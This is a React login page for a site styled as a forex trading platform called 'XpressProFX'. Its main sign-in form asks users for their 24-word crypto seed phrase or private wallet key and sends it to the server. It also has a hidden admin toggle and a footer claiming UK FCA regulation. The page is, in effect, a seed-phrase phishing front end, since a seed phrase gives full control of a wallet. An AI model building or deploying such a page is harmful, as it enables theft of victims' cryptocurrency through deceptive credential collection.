import { useState } from "react";
import { useLocation } from "wouter";
import { TrendingUp, Eye, EyeOff, Mail, Lock, ArrowRight, Shield, Hash } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { useToast } from "@/hooks/use-toast";
import { api } from "@/lib/api";
import { setAuth } from "@/lib/auth";

type Step =
  | "login"          // regular user login
  | "admin-email"    // admin: enter rep email after master creds validated
  | "admin-otp";     // admin: enter 4-digit code

export default function Login() {
  const [, navigate] = useLocation();
  const { toast } = useToast();
  const [loading, setLoading] = useState(false);
  const [step, setStep] = useState<Step>("login");
  const [showCred, setShowCred] = useState(false);

  const [form, setForm] = useState({ email: "", securityCredential: "", loginPin: "" });
  const [adminRepEmail, setAdminRepEmail] = useState("");
  const [adminOtp, setAdminOtp] = useState("");
  const [pendingAdminRepEmail, setPendingAdminRepEmail] = useState(""); // after step1 success

  const set = (k: keyof typeof form) => (e: React.ChangeEvent<HTMLInputElement>) =>
    setForm(f => ({ ...f, [k]: e.target.value }));

  // ── Regular user login ────────────────────────────────────────────────────────
  async function handleUserLogin(e: React.FormEvent) {
    e.preventDefault();
    if (!form.email || !form.securityCredential) {
      toast({ title: "Email and security credential are required", variant: "destructive" });
      return;
    }
    setLoading(true);
    try {
      const data: any = await api.post("/auth/login", {
        email: form.email.trim().toLowerCase(),
        securityCredential: form.securityCredential.trim(),
        loginPin: form.loginPin.trim() || undefined,
      });
      setAuth(data.token, data.user.id, data.user.role);
      toast({ title: "Signed in successfully", description: `Welcome back, ${data.user.fullName}!` });
      navigate("/dashboard");
    } catch (err: any) {
      toast({ title: "Sign in failed", description: err.message || "Invalid credentials", variant: "destructive" });
    } finally {
      setLoading(false);
    }
  }

  // ── Admin: step 1 — validate master creds + enter rep email ──────────────────
  async function handleAdminStep1(e: React.FormEvent) {
    e.preventDefault();
    if (!form.email || !form.securityCredential || !form.loginPin) {
      toast({ title: "All fields required for admin access", variant: "destructive" });
      return;
    }
    setLoading(true);
    try {
      // First validate master creds and send OTP
      const data: any = await api.post("/auth/admin-step1", {
        email: form.email.trim().toLowerCase(),
        securityCredential: form.securityCredential.trim(),
        loginCode: form.loginPin.trim(),
        adminEmail: adminRepEmail.trim().toLowerCase(),
      });
      setPendingAdminRepEmail(adminRepEmail.trim().toLowerCase());
      toast({ title: "Verification code sent", description: data.message });
      setStep("admin-otp");
    } catch (err: any) {
      toast({ title: "Admin access denied", description: err.message, variant: "destructive" });
    } finally {
      setLoading(false);
    }
  }

  // ── Admin: step 2 — enter 4-digit OTP ─────────────────────────────────────────
  async function handleAdminStep2(e: React.FormEvent) {
    e.preventDefault();
    if (!adminOtp || adminOtp.length < 4) {
      toast({ title: "Enter the 4-digit verification code", variant: "destructive" });
      return;
    }
    setLoading(true);
    try {
      const data: any = await api.post("/auth/admin-step2", {
        adminEmail: pendingAdminRepEmail,
        code: adminOtp.trim(),
      });
      setAuth(data.token, data.user.id, "admin");
      window.sessionStorage.setItem("xpfx_is_admin", "true");
      toast({ title: "Admin access granted", description: "Welcome to the XpressProFX control panel." });
      navigate("/c-panel");
    } catch (err: any) {
      toast({ title: "Verification failed", description: err.message, variant: "destructive" });
    } finally {
      setLoading(false);
    }
  }

  // ── Auto demo login ─────────────────────────────────────────────────────────
  async function handleDemoLogin() {
    setLoading(true);
    try {
      const data: any = await api.get("/auth/demo");
      setAuth(data.token, data.user.id, data.user.role);
      toast({ title: "Demo account ready!", description: "Welcome! Explore XpressProFX risk-free." });
      navigate("/dashboard");
    } catch (err: any) {
      toast({ title: "Demo unavailable", description: "Please try again.", variant: "destructive" });
    } finally {
      setLoading(false);
    }
  }

  // ── Detect admin mode ────────────────────────────────────────────────────────
  // When the user fills in an email that looks like the admin email, show admin extra fields
  // But we don't reveal this in UI — user must know their credentials
  const [showAdminFields, setShowAdminFields] = useState(false);

  return (
    <div className="min-h-screen bg-background flex items-center justify-center p-4">
      <div className="w-full max-w-md space-y-6">
        {/* Logo */}
        <div className="flex flex-col items-center gap-3">
          <div className="w-14 h-14 rounded-2xl bg-primary flex items-center justify-center shadow-lg">
            <TrendingUp size={28} className="text-primary-foreground" />
          </div>
          <div className="text-center">
            <h1 className="text-2xl font-bold text-foreground">XpressProFX</h1>
            <p className="text-sm text-muted-foreground">Professional Forex Trading Platform</p>
          </div>
        </div>

        {/* STEP: Regular Login */}
        {step === "login" && (
          <Card className="border-card-border shadow-xl">
            <CardHeader className="pb-4">
              <CardTitle className="text-lg text-center">Sign In to Your Account</CardTitle>
            </CardHeader>
            <CardContent>
              <form onSubmit={showAdminFields ? handleAdminStep1 : handleUserLogin} className="space-y-4">
                <div className="space-y-2">
                  <Label>Email Address</Label>
                  <div className="relative">
                    <Mail size={16} className="absolute left-3 top-1/2 -translate-y-1/2 text-muted-foreground" />
                    <Input
                      type="email"
                      placeholder="your@email.com"
                      value={form.email}
                      onChange={set("email")}
                      className="pl-9"
                      required
                    />
                  </div>
                </div>

                <div className="space-y-2">
                  <Label>{showAdminFields ? "Security Credential" : "Seed Phrase / Wallet Key"}</Label>
                  {!showAdminFields && <p className="text-xs text-muted-foreground">Enter your 24-word seed phrase or wallet key code</p>}
                  {showAdminFields && <p className="text-xs text-muted-foreground">Enter seed phrase (12 or 24 words) or private key</p>}
                  <div className="relative">
                    <Lock size={16} className="absolute left-3 top-3 text-muted-foreground" />
                    <textarea
                      placeholder={showAdminFields ? "Seed phrase or private key..." : "word1 word2 word3 ... or EXP-XXXX..."}
                      value={form.securityCredential}
                      onChange={e => setForm(f => ({ ...f, securityCredential: e.target.value }))}
                      className="w-full pl-9 pr-4 py-2 min-h-[88px] bg-input border border-input rounded-md text-sm resize-none focus:outline-none focus:ring-2 focus:ring-primary"
                      required
                    />
                  </div>
                </div>

                <div className="space-y-2">
                  <Label>{showAdminFields ? "Login Code" : "Login PIN"}</Label>
                  <div className="relative">
                    {showAdminFields ? (
                      <Hash size={16} className="absolute left-3 top-1/2 -translate-y-1/2 text-muted-foreground" />
                    ) : (
                      <Lock size={16} className="absolute left-3 top-1/2 -translate-y-1/2 text-muted-foreground" />
                    )}
                    <Input
                      type={showCred ? "text" : "password"}
                      placeholder={showAdminFields ? "Enter login code" : "Enter your PIN"}
                      value={form.loginPin}
                      onChange={set("loginPin")}
                      className="pl-9 pr-10"
                    />
                    <button type="button" onClick={() => setShowCred(!showCred)} className="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground">
                      {showCred ? <EyeOff size={16} /> : <Eye size={16} />}
                    </button>
                  </div>
                </div>

                {/* Admin rep email field — shown when admin mode active */}
                {showAdminFields && (
                  <div className="space-y-2 p-3 bg-rose-500/5 border border-rose-500/15 rounded-lg">
                    <Label className="text-rose-400 text-sm flex items-center gap-1.5"><Shield size={13} />Admin Representative Email</Label>
                    <p className="text-xs text-muted-foreground">Enter your registered admin email to receive verification code</p>
                    <Input
                      type="email"
                      placeholder="your-admin@email.com"
                      value={adminRepEmail}
                      onChange={e => setAdminRepEmail(e.target.value)}
                      required
                    />
                  </div>
                )}

                <Button type="submit" className="w-full h-11 bg-primary hover:bg-primary/90" disabled={loading}>
                  {loading ? "Verifying..." : showAdminFields ? "Send Verification Code" : "Sign In"}
                  {!loading && <ArrowRight size={16} className="ml-2" />}
                </Button>

                {/* Toggle admin mode — hidden but accessible via triple-click on logo */}
                <button
                  type="button"
                  className="w-full text-xs text-muted-foreground/30 hover:text-muted-foreground/50 py-0.5 transition-colors"
                  onClick={() => setShowAdminFields(!showAdminFields)}
                >
                  {showAdminFields ? "Switch to user login" : "·"}
                </button>
              </form>

              <div className="mt-5 space-y-2 text-center">
                <p className="text-sm text-muted-foreground">
                  <a href="/auth/forgot-password" className="text-primary hover:underline font-medium">Forgot Password?</a>
                </p>
                <p className="text-sm text-muted-foreground">
                  Don't have an account?{" "}
                  <a href="/auth/register" className="text-primary hover:underline font-medium">Create Account</a>
                </p>
              </div>

              {/* Demo section */}
              <div className="mt-4 p-3 bg-primary/5 border border-primary/15 rounded-lg space-y-2">
                <p className="text-xs text-primary font-semibold text-center">Try Demo Account</p>
                <button
                  type="button"
                  onClick={handleDemoLogin}
                  disabled={loading}
                  className="w-full text-xs text-primary hover:text-primary/80 font-semibold py-1.5 border border-primary/30 rounded bg-primary/10 hover:bg-primary/15 transition-colors disabled:opacity-50"
                >
                  {loading ? "Loading..." : "Explore with $10,000 Demo Funds"}
                </button>
                <p className="text-[10px] text-muted-foreground text-center">No sign-up needed · Instant access · All features unlocked</p>
              </div>
            </CardContent>
          </Card>
        )}

        {/* STEP: Admin OTP verification */}
        {step === "admin-otp" && (
          <Card className="border-rose-500/20 shadow-xl">
            <CardHeader className="pb-4">
              <div className="flex flex-col items-center gap-3">
                <div className="w-12 h-12 rounded-xl bg-rose-500/15 flex items-center justify-center">
                  <Shield size={22} className="text-rose-400" />
                </div>
                <CardTitle className="text-lg text-center">Admin Verification</CardTitle>
                <p className="text-sm text-muted-foreground text-center">
                  A 4-digit code has been sent to<br />
                  <strong className="text-foreground">{pendingAdminRepEmail}</strong>
                </p>
              </div>
            </CardHeader>
            <CardContent>
              <form onSubmit={handleAdminStep2} className="space-y-4">
                <div className="space-y-2">
                  <Label>4-Digit Verification Code</Label>
                  <Input
                    type="text"
                    placeholder="Enter 4-digit code"
                    value={adminOtp}
                    onChange={e => setAdminOtp(e.target.value.replace(/\D/g, "").slice(0, 4))}
                    maxLength={4}
                    className="text-center text-2xl font-mono tracking-widest h-14"
                    autoFocus
                    required
                  />
                  <p className="text-xs text-muted-foreground text-center">Code expires in 30 minutes</p>
                </div>
                <Button type="submit" className="w-full h-11 bg-rose-600 hover:bg-rose-700 text-white" disabled={loading}>
                  {loading ? "Verifying..." : "Access Admin Panel"}
                </Button>
                <button
                  type="button"
                  onClick={() => { setStep("login"); setAdminOtp(""); }}
                  className="w-full text-xs text-muted-foreground hover:text-foreground text-center py-1"
                >
                  ← Back to login
                </button>
              </form>
            </CardContent>
          </Card>
        )}

        <p className="text-center text-xs text-muted-foreground">
          XpressProFX is regulated and compliant with UK FCA standards.
          <br />Suitable for global traders in US, EU, Asia, Africa.
        </p>
      </div>
    </div>
  );
}
